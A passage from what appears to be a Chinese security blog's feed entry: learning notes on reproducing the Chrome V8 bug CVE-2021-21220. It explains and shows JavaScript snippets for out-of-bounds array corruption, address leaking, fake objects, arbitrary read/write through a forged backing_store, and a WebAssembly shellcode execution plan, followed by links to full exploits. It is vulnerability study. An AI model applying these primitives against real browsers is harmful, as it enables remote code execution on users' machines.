&lt;p&gt;  在2、3两步,我们能够得到一个数组和一个ArrayBuffer,但是我们还不能任意读写这个ArrayBuffer,一种实现方法是,通过corrput_arr的溢出,将rwarr的长度变长,覆盖到ArrayBuffer,于是我们就能够对他进行任意读写,从而实现对内存任意地址读写(其实是受限的,rwx)&lt;/p&gt;
&lt;p&gt;  为什么要强调ArrayBuffer呢?且看下面&lt;/p&gt;
&lt;p&gt;  疑问:从而实现对rwarr(local_arr)的跨界访问,为啥要这样呢?? 为啥不直接用arr&lt;/p&gt;
&lt;h2 id=&#34;越界访问rwarr数组-实现可控的JSArrayBuffer&#34;&gt;&lt;a href=&#34;#越界访问rwarr数组-实现可控的JSArrayBuffer&#34; class=&#34;headerlink&#34; title=&#34;越界访问rwarr数组(实现可控的JSArrayBuffer)&#34;&gt;&lt;/a&gt;越界访问rwarr数组(实现可控的JSArrayBuffer)&lt;/h2&gt;&lt;p&gt;  这张图比较形象,我们现在可以越界访问的是corrupt_arr,然后新建了一个rwarr数组,那么可以越界访问,把rwarr的长度修改的大一点,对应代码 corrput_arr[12] &amp;#x3D; 0x22444;&lt;/p&gt;
&lt;p&gt;  那么为什么数组的第13位是代表着它的长度呢?这个具体原理方法在参考博客里,和它的数据结构有关.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_3.png&#34; alt=&#34;Untitled_3&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;越界访问corrupt-buff-实现任意地址读写&#34;&gt;&lt;a href=&#34;#越界访问corrupt-buff-实现任意地址读写&#34; class=&#34;headerlink&#34; title=&#34;越界访问corrupt_buff(实现任意地址读写)&#34;&gt;&lt;/a&gt;&lt;strong&gt;&lt;strong&gt;越界访问corrupt_buff(实现任意地址读写)&lt;/strong&gt;&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;http://www.hackdig.com/03/hack-70813.htm&#34;&gt;http://www.hackdig.com/03/hack-70813.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  背景知识:什么是backing_store? 对漏洞利用有什么用?&lt;/p&gt;
&lt;p&gt;  backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。&lt;/p&gt;
&lt;p&gt;  如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。&lt;/p&gt;
&lt;h3 id=&#34;任意地址写-通过伪造backing-store&#34;&gt;&lt;a href=&#34;#任意地址写-通过伪造backing-store&#34; class=&#34;headerlink&#34; title=&#34;任意地址写(通过伪造backing_store)&#34;&gt;&lt;/a&gt;任意地址写(通过伪造backing_store)&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;setbackingStore&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(hi, low)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           rwarr[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = i2f(fLow(rwarr[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]), hi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           rwarr[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;] = i2f(low, fHi(rwarr[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;   从corrupt_buff中声明一个Dataview,而backing_store记录的就是实际DataView的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。&lt;/p&gt;
&lt;p&gt;  那么我们已经可以利用rwarr实现对corrupt_buff的任意读写,即可以任意修改backing_store.&lt;/p&gt;
&lt;h3 id=&#34;任意地址读-类型混淆&#34;&gt;&lt;a href=&#34;#任意地址读-类型混淆&#34; class=&#34;headerlink&#34; title=&#34;任意地址读(类型混淆)&#34;&gt;&lt;/a&gt;任意地址读(类型混淆)&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;leakObjLow&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(o)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           corrupt_buff.slot = o;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (fLow(rwarr[&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;  leakObjLow函数使用corrupt_buff的slot属性，修改该属性为某一对象o，那么o的地址就会被写入到corrupt_buff所在的内存区间中，然后利用rwarr的溢出访问该值，实现泄露。&lt;/p&gt;
&lt;p&gt;  这里是不是用了类型混淆??&lt;/p&gt;
&lt;h3 id=&#34;利用oob造成类型混淆-那怎么利用呢&#34;&gt;&lt;a href=&#34;#利用oob造成类型混淆-那怎么利用呢&#34; class=&#34;headerlink&#34; title=&#34;利用oob造成类型混淆,那怎么利用呢?&#34;&gt;&lt;/a&gt;利用oob造成类型混淆,那怎么利用呢?&lt;/h3&gt;&lt;p&gt;那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/203721.html&#34;&gt;https://www.freebuf.com/vuls/203721.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;addressOf 泄露某个对象的内存地址&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 泄露某个object的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;addressOf&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(obj_to_leak)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    obj_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = obj_to_leak;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    obj_array.oob(float_array_map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let obj_addr = f2i(obj_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    obj_array.oob(obj_array_map); &lt;span class=&#34;comment&#34;&gt;// 还原array类型以便后续继续使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; obj_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;fakeObject 将指定内存强制转换为一个js对象(有什么用呢?)&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 将某个addr强制转换为object对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;fakeObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(addr_to_fake)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    float_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = i2f(addr_to_fake + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    float_array.oob(obj_array_map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let faked_obj = float_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    float_array.oob(float_array_map); &lt;span class=&#34;comment&#34;&gt;// 还原array类型以便后续继续使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; faked_obj;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;如何实现任意地址读写：构造AAR-x2F-AAW原语&#34;&gt;&lt;a href=&#34;#如何实现任意地址读写：构造AAR-x2F-AAW原语&#34; class=&#34;headerlink&#34; title=&#34;如何实现任意地址读写：构造AAR&amp;#x2F;AAW原语&#34;&gt;&lt;/a&gt;&lt;strong&gt;&lt;strong&gt;如何实现任意地址读写：构造AAR&amp;#x2F;AAW原语&lt;/strong&gt;&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1821/#wasm&#34;&gt;https://paper.seebug.org/1821/#wasm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;fakeObject强制将一块内存伪造成一个数组对象??? 它的elements 指针是可控的,而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容,实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。&lt;/p&gt;
&lt;p&gt;哦哦哦因为可以任意访问,把这个当成一个数组对象了,那么对这个数组,我们是可以任意读取和修改的????&lt;/p&gt;
&lt;h2 id=&#34;wasm-webassembly-实现执行shellcode&#34;&gt;&lt;a href=&#34;#wasm-webassembly-实现执行shellcode&#34; class=&#34;headerlink&#34; title=&#34;wasm(webassembly) 实现执行shellcode&#34;&gt;&lt;/a&gt;wasm(webassembly) 实现执行shellcode&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1821/#wasm&#34;&gt;https://paper.seebug.org/1821/#wasm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/203721.html&#34;&gt;https://www.freebuf.com/vuls/203721.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://sensepost.com/blog/2018/introduction-to-webassembly/&#34;&gt;https://sensepost.com/blog/2018/introduction-to-webassembly/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用思路&#34;&gt;&lt;a href=&#34;#利用思路&#34; class=&#34;headerlink&#34; title=&#34;利用思路&#34;&gt;&lt;/a&gt;利用思路&lt;/h3&gt;&lt;p&gt;首先加载一段wasm代码到内存中&lt;br&gt;然后通过addresssOf原语找到存放wasm的内存地址&lt;br&gt;接着通过任意地址写原语用shellcode替换原本wasm的代码内容&lt;br&gt;最后调用wasm的函数接口即可触发调用shellcode&lt;/p&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;h2 id=&#34;漏洞复现参考&#34;&gt;&lt;a href=&#34;#漏洞复现参考&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现参考&#34;&gt;&lt;/a&gt;漏洞复现参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/m0_56642842/article/details/118358830&#34;&gt;https://blog.csdn.net/m0_56642842&amp;#x2F;article&amp;#x2F;details&amp;#x2F;118358830&lt;/a&gt; 这个就是教你怎么复现,不涉及原理&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/7omss/p/15661338.html&#34;&gt;https://www.cnblogs.com/7omss/p/15661338.html&lt;/a&gt; + 1&lt;/p&gt;
&lt;p&gt;exploit:&lt;a href=&#34;https://share.weiyun.com/EXlNm02A&#34;&gt;https://share.weiyun.com/EXlNm02A&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;浏览器:&lt;a href=&#34;https://share.weiyun.com/fZLcxFe9&#34;&gt;https://share.weiyun.com/fZLcxFe9&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞分析、调试及RCE步骤参考&#34;&gt;&lt;a href=&#34;#漏洞分析、调试及RCE步骤参考&#34; class=&#34;headerlink&#34; title=&#34;漏洞分析、调试及RCE步骤参考&#34;&gt;&lt;/a&gt;漏洞分析、调试及RCE步骤参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/365297858&#34;&gt;https://zhuanlan.zhihu.com/p/365297858&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/smellycat000/article/details/116078164&#34;&gt;https://blog.csdn.net/smellycat000/article/details/116078164&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&#34;&gt;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/&#34;&gt;https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js&#34;&gt;https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://buaq.net/go-97833.html&#34;&gt;https://buaq.net/go-97833.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/&#34;&gt;https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220分析/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts/2021-04-16-CVE-2021-21220.md&#34;&gt;https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts&amp;#x2F;2021-04-16-CVE-2021-21220.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&#34;&gt;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf&#34;&gt;https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sohu.com/a/383228797_354899&#34;&gt;https://www.sohu.com/a/383228797_354899&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bounty-team.github.io/vulnerability%20analysis/2021/04/16/CVE-2021-21220/&#34;&gt;https://bounty-team.github.io/vulnerability analysis/2021/04/16/CVE-2021-21220/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/269629.html&#34;&gt;https://www.freebuf.com/vuls/269629.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cjovi.icu/CVE/1586.html&#34;&gt;https://www.cjovi.icu/CVE/1586.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/5190&#34;&gt;https://xz.aliyun.com/t/5190&lt;/a&gt;。&lt;strong&gt;v8 exploit入门[PlaidCTF roll a d8]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gtoad.github.io/2019/07/25/V8-Debug/&#34;&gt;https://gtoad.github.io/2019/07/25/V8-Debug/&lt;/a&gt;  &lt;strong&gt;&lt;strong&gt;V8引擎漏洞分析环境与调试方法基础&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1850/&#34;&gt;https://paper.seebug.org/1850/&lt;/a&gt;   &lt;strong&gt;&lt;strong&gt;从 0 开始学 V8 漏洞利用之 CVE-2021-21220（八）&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/230182.html&#34;&gt;https://www.freebuf.com/vuls/230182.html&lt;/a&gt;。&lt;strong&gt;&lt;strong&gt;v8利用入门：从越界访问到RCE&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/203721.html&#34;&gt;https://www.freebuf.com/vuls/203721.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cjovi.icu/CVE/1586.html&#34;&gt;https://www.cjovi.icu/CVE/1586.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tiszka.com/blog/CVE_2021_21225.html&#34;&gt;https://tiszka.com/blog/CVE_2021_21225.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kiprey.github.io/2021/01/v8-turboFan/&#34;&gt;https://kiprey.github.io/2021/01/v8-turboFan/&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="浏览器安全" />
        <updated>2022-11-17T14:20:59.000Z</updated>
    </entry>
</feed>
